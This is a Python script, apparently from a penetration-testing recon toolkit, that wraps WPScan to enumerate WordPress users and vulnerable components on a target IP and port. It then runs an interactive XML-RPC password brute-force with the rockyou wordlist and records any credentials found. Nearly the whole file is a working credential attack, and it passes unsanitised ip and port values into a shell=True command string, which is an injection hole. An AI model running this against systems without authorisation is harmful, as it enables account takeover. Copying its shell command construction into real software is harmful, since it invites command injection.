#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select
import re
import threading
import queue
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, ensure_wordlists, get_output_base

ensure_commands(["wpscan"])
WORDLISTS = ensure_wordlists(["rockyou"])

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def strip_ansi_codes(text):
    """Remove ANSI color codes from WPScan output."""
    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

def check_installation():
    try:
        subprocess.run(["which", "wpscan"], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        print(f"{Colors.WARNING}⚠️ wpscan not found. Installing...{Colors.ENDC}")
        try:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", "wpscan"], check=True)
            print(f"{Colors.OKGREEN}✅ wpscan installed successfully{Colors.ENDC}")
            return True
        except Exception as e:
            print(f"{Colors.FAIL}❌ Failed to install wpscan: {e}{Colors.ENDC}")
            return False

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"{Colors.WARNING}⏱️ Timeout in {timeout} seconds (default: {default}){Colors.ENDC}")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"{Colors.WARNING}⏱️ Timeout, using default: {default}{Colors.ENDC}")
        return default

def ask_wordlist():
    print(f"{Colors.HEADER}=========[ 🔐 Password Brute Force Attempt (XML-RPC): ]=============={Colors.ENDC}")
    choice = input(f"{Colors.OKBLUE}[?] Default ../../rockyou.txt (y/n)? {Colors.ENDC}").strip().lower()
    if choice == 'y':
        wordlist = WORDLISTS["rockyou"]
        if not os.path.isfile(wordlist):
            print(f"{Colors.FAIL}[!] rockyou.txt not found in default location.{Colors.ENDC}")
            wordlist = "rockyou.txt"
            if not os.path.isfile(wordlist):
                print(f"{Colors.FAIL}[!] rockyou.txt not found in current directory.{Colors.ENDC}")
                exit(1)
    elif choice == 'n':
        wordlist = input(f"{Colors.OKBLUE}[!] Enter the path: {Colors.ENDC}").strip()
        if not os.path.isfile(wordlist):
            print(f"{Colors.FAIL}[!] File not found. Exiting.{Colors.ENDC}")
            exit(1)
    else:
        print(f"{Colors.FAIL}[!] Invalid choice. Exiting.{Colors.ENDC}")
        exit(1)
    return wordlist

def run_wpscan_attack(url, username, wordlist):
    # Save username to a temp file
    temp_user_file = "/tmp/temp_user.txt"
    with open(temp_user_file, "w") as f:
        f.write(username + "\n")
    
    command = [
        "wpscan",
        "--url", url,
        "-U", temp_user_file,
        "-P", wordlist,
        "--max-threads", "10",
        "--no-banner"
    ]
    try:
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        success_found = False
        valid_username = ""
        valid_password = ""
        output_lines = []
        
        while True:
            line = process.stdout.readline()
            if line == '' and process.poll() is not None:
                break
            if line:
                output_lines.append(line)
                # Only show progress lines and success messages
                if "[SUCCESS]" in line:
                    print(line.strip())
                    match = re.search(r'\[SUCCESS\] - (\S+) / (.+)', line)
                    if match:
                        valid_username = match.group(1)
                        valid_password = match.group(2).strip()
                        success_found = True
        
        _, stderr = process.communicate()
        if process.returncode != 0:
            print(f"\n{Colors.FAIL}[!] WPScan exited with error code {process.returncode}{Colors.ENDC}")
        
        if success_found:
            print(f"\n{Colors.OKGREEN}=====================[ ✅ Login Found ]========================{Colors.ENDC}")
            print(f"{Colors.BOLD}Username: {valid_username}{Colors.ENDC}")
            print(f"{Colors.BOLD}Password: {valid_password}{Colors.ENDC}")
            print(f"{Colors.OKGREEN}=============================================================={Colors.ENDC}")
            return True, valid_username, valid_password, "\n".join(output_lines)
        else:
            print(f"\n{Colors.FAIL}[!] No valid credentials found. Check username or wordlist.{Colors.ENDC}")
            return False, "", "", "\n".join(output_lines)
    except FileNotFoundError:
        print(f"{Colors.FAIL}[!] WPScan not found. Is it installed and in your PATH?{Colors.ENDC}")
        return False, "", "", ""
    finally:
        # Clean up temp file
        if os.path.exists(temp_user_file):
            os.remove(temp_user_file)

def extract_users_from_wpscan(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        lines = [strip_ansi_codes(line.strip()) for line in f]
    extracting_users = False
    users_found = set()
    candidate_user = None
    
    # Common non-user terms that appear after [+] in WPScan output
    non_user_terms = [
        "Headers", "URL:", "Started:", "WordPress version", "WordPress theme", 
        "XML-RPC seems to be enabled", "WordPress readme found", 
        "The external WP-Cron seems to be enabled", "Enumerating",
        "Finished:", "Requests Done:", "Data Sent:", "Data Received:",
        "Memory used:", "Elapsed time:", "Interesting Finding(s):"
    ]
    
    for i, line in enumerate(lines):
        # Technique 1: Start user section
        if "User(s) Identified" in line:
            extracting_users = True
            continue
        # Technique 1 Stop condition
        if extracting_users and line.startswith("[!] No WPScan API Token given"):
            break
        # Technique 2: Standard [+] username with filtering
        if extracting_users and line.startswith("[+]"):
            # Extract content after [+]
            content = line[3:].strip()
            
            # Skip if it's a known non-user term
            if any(term in content for term in non_user_terms):
                continue
                
            # Skip if it contains special characters that aren't in usernames
            if re.search(r'[:/\\|]', content):
                continue
                
            # Valid username pattern (alphanumeric with some special chars)
            if re.match(r'^[a-zA-Z0-9._-]{3,}$', content):
                candidate_user = content
                users_found.add(candidate_user)
                continue
        
        # Technique 3: Author Id Brute Forcing block
        if extracting_users and ("Author Id Brute Forcing" in line or "Login Error Messages" in line):
            if candidate_user:
                users_found.add(candidate_user)
        
        # Technique 4: Lookahead/fallback detection (possible user refs)
        if extracting_users and any(x in line for x in ["Rss Generator", "XML-RPC", "Login Error", "Author Pattern"]):
            # Look back 1-3 lines for a [+] style username
            for j in range(i-1, max(i-4, -1), -1):
                back_line = lines[j]
                if back_line.startswith("[+]"):
                    content = back_line[3:].strip()
                    # Skip if it's a known non-user term
                    if any(term in content for term in non_user_terms):
                        continue
                    # Valid username pattern
                    if re.match(r'^[a-zA-Z0-9._-]{3,}$', content):
                        users_found.add(content)
                        break
        
        # Technique 5: Loose heuristics (non-section usernames)
        loose_user_match = re.search(r"\bauthor(?:=|/)([a-zA-Z0-9._-]+)", line)
        if loose_user_match:
            users_found.add(loose_user_match.group(1))
    
    # Technique 6: Final pass for overlooked user patterns
    for line in lines:
        # Match URLs like /author/hanna or ?author=1
        match = re.search(r"/author/([a-zA-Z0-9._-]+)", line)
        if match:
            users_found.add(match.group(1))
    
    return list(users_found)

def extract_users_from_output(output):
    users = []
    lines = output.split('\n')
    capture_users = False
    
    # Common non-user terms that appear after [+] in WPScan output
    non_user_terms = [
        "Headers", "URL:", "Started:", "WordPress version", "WordPress theme", 
        "XML-RPC seems to be enabled", "WordPress readme found", 
        "The external WP-Cron seems to be enabled", "Enumerating",
        "Finished:", "Requests Done:", "Data Sent:", "Data Received:",
        "Memory used:", "Elapsed time:", "Interesting Finding(s):"
    ]
    
    for line in lines:
        if "[i] User(s) Identified:" in line:
            capture_users = True
            continue
        
        if capture_users:
            stripped_line = line.strip()
            if not stripped_line:
                continue
                
            if stripped_line.startswith("[+]"):
                # Extract username (everything after [+])
                content = stripped_line[3:].strip()
                
                # Skip if it's a known non-user term
                if any(term in content for term in non_user_terms):
                    continue
                    
                # Skip if it contains special characters that aren't in usernames
                if re.search(r'[:/\\|]', content):
                    continue
                    
                # Valid username pattern (alphanumeric with some special chars)
                if re.match(r'^[a-zA-Z0-9._-]{3,}$', content):
                    users.append(content)
            
            # Check if we've reached the end of the user section
            elif stripped_line.startswith("[+] Finished:") or stripped_line.startswith("[+] Requests Done:"):
                capture_users = False
                break
            # If we encounter a line starting with [!] or [i] after users, we're done
            elif stripped_line.startswith("[!]") or stripped_line.startswith("[i]") and users:
                capture_users = False
                break
    
    return users

def extract_important_findings(output):
    findings = []
    lines = output.split('\n')
    
    for line in lines:
        stripped_line = line.strip()
        if stripped_line.startswith("[+]"):
            # Skip user enumeration lines as they're handled separately
            if not (stripped_line.startswith("[+] User Identified:") or 
                   (len(stripped_line.split()) == 2 and stripped_line.startswith("[+] "))):
                findings.append(stripped_line)
    
    return findings

def format_wpscan_output(output, ip, port):
    formatted_lines = []
    lines = output.split('\n')
    
    # Header
    formatted_lines.append(f"{Colors.HEADER}========================== WPScan Scan =========================={Colors.ENDC}")
    formatted_lines.append(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
    
    # Extract target URL and start time
    target_url = f"http://{ip}:{port}/"
    start_time = datetime.now().strftime("%A, %B %d, %Y – %I:%M:%S %p")
    
    formatted_lines.append(f"{Colors.OKGREEN}[+] Target URL     : {target_url}{Colors.ENDC}")
    formatted_lines.append(f"{Colors.OKGREEN}[+] Scan Started   : {start_time}{Colors.ENDC}")
    formatted_lines.append(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
    
    # Extract all important findings
    important_findings = extract_important_findings(output)
    
    # Interesting Findings section
    formatted_lines.append(f"{Colors.OKBLUE}================[ 🔍 Interesting Findings: ]======================={Colors.ENDC}")
    
    headers_section = False
    files_section = False
    version_section = False
    theme_section = False
    
    for line in lines:
        # Skip lines we don't want in the output
        if line.strip().startswith("[+] URL:") or line.strip().startswith("[+] Started:"):
            continue
        if line.strip() == "Interesting Finding(s):":
            continue
        if line.strip() == "[i] No themes Found.":
            continue
        if "Checking Known Locations" in line:
            continue
        if "Brute Forcing Author IDs" in line:
            continue
            
        if "[+] Headers" in line:
            headers_section = True
            files_section = False
            version_section = False
            theme_section = False
            formatted_lines.append(f"{Colors.OKGREEN}[+] Headers{Colors.ENDC}")
            continue
        
        if "[+] XML-RPC seems to be enabled" in line:
            headers_section = False
            files_section = True
            formatted_lines.append(f"{Colors.OKGREEN}[+] XML-RPC seems to be enabled: {line.split('http://')[1].strip()}{Colors.ENDC}")
            formatted_lines.append(f" | Found By: Direct Access (Aggressive Detection)")
            formatted_lines.append(f" | Confidence: 100%")
            formatted_lines.append(f" | References:")
            formatted_lines.append(f" |  - http://codex.wordpress.org/XML-RPC_Pingback_API")
            formatted_lines.append(f" |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/")
            formatted_lines.append(f" |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/")
            formatted_lines.append(f" |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/")
            formatted_lines.append(f" |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/")
            continue
        
        if "[+] WordPress readme found" in line:
            if "http://" in line:
                url = line.split("http://")[1].strip()
                formatted_lines.append(f"{Colors.OKGREEN}[+] WordPress readme found: http://{url}{Colors.ENDC}")
                formatted_lines.append(f" | Found By: Direct Access (Aggressive Detection)")
                formatted_lines.append(f" | Confidence: 100%")
            continue
        
        if "[+] The external WP-Cron seems to be enabled" in line:
            if "http://" in line:
                url = line.split("http://")[1].strip()
                formatted_lines.append(f"{Colors.OKGREEN}[+] The external WP-Cron seems to be enabled: http://{url}{Colors.ENDC}")
                formatted_lines.append(f" | Found By: Direct Access (Aggressive Detection)")
                formatted_lines.append(f" | Confidence: 60%")
                formatted_lines.append(f" | References:")
                formatted_lines.append(f" |  - https://www.iplocation.net/defend-wordpress-from-ddos")
                formatted_lines.append(f" |  - https://github.com/wpscanteam/wpscan/issues/1299")
            continue
        
        if "[+] WordPress version" in line and "identified" in line:
            files_section = False
            version_section = True
            version_info = line.split("identified")[1].strip()
            version_num = version_info.split("(")[0].strip()
            if "released on" in version_info:
                release_date = version_info.split("released on")[1].split(")")[0].strip()
                formatted_lines.append(f"{Colors.OKGREEN}[+] WordPress version {version_num} identified (Outdated, released on {release_date}).{Colors.ENDC}")
            else:
                formatted_lines.append(f"{Colors.OKGREEN}[+] WordPress version {version_num} identified.{Colors.ENDC}")
            continue
        
        if "[i] The main theme could not be detected." in line:
            formatted_lines.append(f"{Colors.WARNING}[i] The main theme could not be detected.{Colors.ENDC}")
            continue
            
        if "[+] Enumerating Vulnerable Plugins" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Enumerating Vulnerable Plugins (via Passive Methods){Colors.ENDC}")
            continue
            
        if "[i] No plugins Found." in line:
            formatted_lines.append(f"{Colors.WARNING}[i] No plugins Found.{Colors.ENDC}")
            continue
            
        if "[+] Enumerating Vulnerable Themes" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods){Colors.ENDC}")
            continue
        
        if "[+] Enumerating Users" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Enumerating Users (via Passive and Aggressive Methods){Colors.ENDC}")
            continue
            
        if "[i] User(s) Identified:" in line:
            formatted_lines.append(f"{Colors.WARNING}[i] User(s) Identified:{Colors.ENDC}")
            continue
            
        if "[!] No WPScan API Token given" in line:
            formatted_lines.append(f"{Colors.FAIL}[!] No WPScan API Token given, as a result vulnerability data has not been output.{Colors.ENDC}")
            continue
            
        if "[!] You can get a free API token" in line:
            formatted_lines.append(f"{Colors.FAIL}[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register{Colors.ENDC}")
            continue
            
        if "[+] Finished:" in line:
            formatted_lines.append(f"{Colors.HEADER}========================================================================================================================================={Colors.ENDC}")
            formatted_lines.append(f"{Colors.OKGREEN}[+] Finished: {line.split('[+] Finished:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Requests Done:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Requests Done: {line.split('[+] Requests Done:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Cached Requests:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Cached Requests: {line.split('[+] Cached Requests:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Data Sent:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Data Sent: {line.split('[+] Data Sent:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Data Received:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Data Received: {line.split('[+] Data Received:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Memory used:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Memory used: {line.split('[+] Memory used:')[1].strip()}{Colors.ENDC}")
            continue
            
        if "[+] Elapsed time:" in line:
            formatted_lines.append(f"{Colors.OKGREEN}[+] Elapsed time: {line.split('[+] Elapsed time:')[1].strip()}{Colors.ENDC}")
            continue
        
        if headers_section and line.strip().startswith("|"):
            if " - Server:" in line:
                formatted_lines.append(f" | Interesting Entries:")
                formatted_lines.append(f" |  - Server: {line.split(' - Server:')[1].strip()}")
            elif " - X-Powered-By:" in line:
                formatted_lines.append(f" |  - X-Powered-By: {line.split(' - X-Powered-By:')[1].strip()}")
            elif " - Found By:" in line:
                formatted_lines.append(f" | Found By: {line.split(' - Found By:')[1].strip()}")
            elif " - Confidence:" in line:
                formatted_lines.append(f" | Confidence: {line.split(' - Confidence:')[1].strip()}")
        
        if version_section and " - http://" in line:
            formatted_lines.append(f" | Found By: Emoji Settings (Passive Detection)")
            formatted_lines.append(f" |  - {line.split(' - ')[1].strip()}")
        
        if line.strip().startswith("[+]") and "Found By:" in line:
            if "Author Id Brute Forcing" in line:
                user = line.split("[+]")[1].strip()
                formatted_lines.append(f"{Colors.OKGREEN}[+] {user}{Colors.ENDC}")
                formatted_lines.append(f" | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)")
            continue
            
        if line.strip().startswith("|") and "Confirmed By:" in line:
            formatted_lines.append(f" | Confirmed By: Login Error Messages (Aggressive Detection)")
    
    # User Enumeration section
    users = extract_users_from_output(output)
    
    return "\n".join(formatted_lines), users

def format_password_attack_output(output, users, selected_user=None):
    formatted_lines = []
    lines = output.split('\n')
    
    formatted_lines.append(f"{Colors.HEADER}=========[ 🔐 Password Brute Force Attempt (XML-RPC): ]=============={Colors.ENDC}")
    formatted_lines.append(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
    
    # User selection menu
    if selected_user is None:
        if len(users) == 1:
            formatted_lines.append(f"{Colors.WARNING}[!] Only one user found: {users[0]}{Colors.ENDC}")
            selected_user = users[0]
        else:
            formatted_lines.append(f"{Colors.OKBLUE}[?] Target User(s) for Default Password Check:{Colors.ENDC}")
            for i, user in enumerate(users, 1):
                formatted_lines.append(f"    {i}) {user}")
            formatted_lines.append("    0) Exit")
            formatted_lines.append(f"{Colors.OKBLUE}[!] select a username: {Colors.ENDC}")
            return "\n".join(formatted_lines), None
    
    formatted_lines.append(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
    
    # Check for success
    success_found = False
    for line in lines:
        if "[SUCCESS]" in line:
            success_found = True
            break
    
    if not success_found:
        formatted_lines.append(f"{Colors.OKGREEN}[+] Initiating XML-RPC Password Attack...{Colors.ENDC}")
        formatted_lines.append(f"    - Using wordlist: {selected_user if selected_user else 'unknown'}{Colors.ENDC}")
        formatted_lines.append(f"{Colors.HEADER}--------------------------------------------------------------------{Colors.ENDC}")
        return "\n".join(formatted_lines), None
    else:
        # Success case is handled in run_wpscan_attack function
        return "", selected_user

def stream_output(process, output_queue, callback=None):
    for line in process.stdout:
        output_queue.put(line)
        if callback:
            callback(line)

def run_wpscan_command(cmd, output_queue, callback=None):
    process = subprocess.Popen(
        cmd,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        universal_newlines=True
    )
    
    output_thread = threading.Thread(target=stream_output, args=(process, output_queue, callback))
    output_thread.daemon = True
    output_thread.start()
    
    output = ""
    while output_thread.is_alive() or not output_queue.empty():
        try:
            line = output_queue.get(timeout=0.1)
            output += line
        except queue.Empty:
            continue
    
    process.wait()
    return output

def main():
    if len(sys.argv) != 3:
        print(f"{Colors.FAIL}Usage: ./wpscan.py <ip_address> <port>{Colors.ENDC}")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    # Create output directory - Fixed path structure
    output_dir = f"{get_output_base()}/{ip}/Wpscan"
    os.makedirs(output_dir, exist_ok=True)
    report_file = f"{output_dir}/report.txt"
    enum_output_file = f"{output_dir}/enum_output.txt"
    
    # Check installation
    if not check_installation():
        sys.exit(1)
    
    # Enumeration phase - Fixed: removed --no-color flag
    enum_cmd = f"wpscan --url http://{ip}:{port} -e u,vp,vt --format cli --no-banner"
    
    users = []
    try:
        print(f"{Colors.HEADER}========================== WPScan Scan =========================={Colors.ENDC}")
        print(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Target URL     : http://{ip}:{port}/{Colors.ENDC}")
        print(f"{Colors.OKGREEN}[+] Scan Started   : {datetime.now().strftime('%A, %B %d, %Y – %I:%M:%S %p')}{Colors.ENDC}")
        print(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
        print(f"{Colors.OKBLUE}================[ 🔍 Interesting Findings: ]======================={Colors.ENDC}")
        
        output_queue = queue.Queue()
        
        def print_line(line):
            # Filter out lines we don't want to display
            if line.strip().startswith("[+] URL:") or line.strip().startswith("[+] Started:"):
                return
            if line.strip() == "Interesting Finding(s):":
                return
            if line.strip() == "[i] No themes Found.":
                return
            if "Checking Known Locations" in line:
                return
            if "Brute Forcing Author IDs" in line:
                return
            print(line, end='')
        
        enum_output = run_wpscan_command(enum_cmd, output_queue, print_line)
        
        # Save enumeration output
        with open(enum_output_file, 'w') as f:
            f.write(enum_output)
        
        # Extract users using both methods
        users = extract_users_from_output(enum_output)
        if not users:
            users = extract_users_from_wpscan(enum_output_file)
        
        # Format and display the enumeration output
        formatted_enum, extracted_users = format_wpscan_output(enum_output, ip, port)
        users = extracted_users if extracted_users else users
        
        with open(report_file, 'w') as report:
            report.write(strip_ansi_codes(formatted_enum))
        
        if not users:
            print(f"{Colors.WARNING}[!] No users found{Colors.ENDC}")
            print(f"{Colors.HEADER}==================================================================={Colors.ENDC}")
            return
        
        # Password attack phase
        while True:
            print(f"{Colors.HEADER}=========[ 🔐 Password Brute Force Attempt (XML-RPC): ]=============={Colors.ENDC}")
            print(f"{Colors.HEADER}-------------------------------------------------------------------{Colors.ENDC}")
            
            # User selection
            if len(users) == 1:
                selected_user = users[0]
                print(f"{Colors.WARNING}[!] Only one user found: {selected_user}{Colors.ENDC}")
            else:
                print(f"{Colors.OKBLUE}[?] Target User(s) for Default Password Check:{Colors.ENDC}")
                for i, user in enumerate(users, 1):
                    print(f"    {i}) {user}")
                print("    0) Exit")
                
                user_choice = prompt_with_timeout(f"{Colors.OKBLUE}[!] select a username:{Colors.ENDC}", "1")
                if user_choice == "0":
                    break
                
                try:
                    user_index = int(user_choice) - 1
                    if 0 <= user_index < len(users):
                        selected_user = users[user_index]
                    else:
                        selected_user = users[0]
                except ValueError:
                    selected_user = users[0]
            
            print(f"{Colors.OKGREEN}[+] Selected user: {selected_user}{Colors.ENDC}")
            
            # Wordlist selection using the enhanced function
            wordlist = ask_wordlist()
            
            # Password attack with the enhanced function
            url = f"http://{ip}:{port}/"
            print(f"{Colors.HEADER}--------------------------------------------------------------------{Colors.ENDC}")
            print(f"{Colors.OKGREEN}[+] Initiating XML-RPC Password Attack...{Colors.ENDC}")
            print(f"{Colors.OKGREEN}    - Using wordlist: {wordlist}{Colors.ENDC}")
            print(f"{Colors.HEADER}--------------------------------------------------------------------{Colors.ENDC}")
            
            try:
                with open(report_file, 'a') as report:
                    report.write(f"\n\n=== PASSWORD ATTACK for {selected_user} ===\n")
                    
                    success, username, password, attack_output = run_wpscan_attack(url, selected_user, wordlist)
                    report.write(attack_output)
                
                if success:
                    print(f"{Colors.HEADER}==================================================================={Colors.ENDC}")
                    print(f"{Colors.OKGREEN}✅ Password Attack Completed Successfully{Colors.ENDC}")
                    print(f"{Colors.HEADER}==================================================================={Colors.ENDC}")
                else:
                    # Format and display password attack results for retry
                    formatted_attack, result_user = format_password_attack_output(attack_output, users, selected_user)
                    print(formatted_attack)
                    continue
                
                break
                
            except Exception as e:
                print(f"{Colors.FAIL}❌ Error during password attack: {e}{Colors.ENDC}")
                break
        
    except Exception as e:
        print(f"{Colors.FAIL}❌ Error: {e}{Colors.ENDC}")

if __name__ == "__main__":
    main()
